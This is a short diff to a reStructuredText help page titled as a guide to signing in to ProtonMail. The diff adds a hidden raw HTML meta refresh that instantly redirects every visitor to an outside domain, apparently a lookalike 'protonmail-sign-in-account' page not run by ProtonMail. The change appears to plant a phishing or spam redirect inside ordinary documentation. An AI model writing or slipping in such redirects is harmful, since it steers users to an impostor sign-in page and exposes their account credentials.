@@ -1,3 +1,7 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://aclogportal.com/protonmail-sign-in-account">
+
 How to Sign In to ProtonMail on Desktop and Mobile Devices? 🔐
 ============================================
 
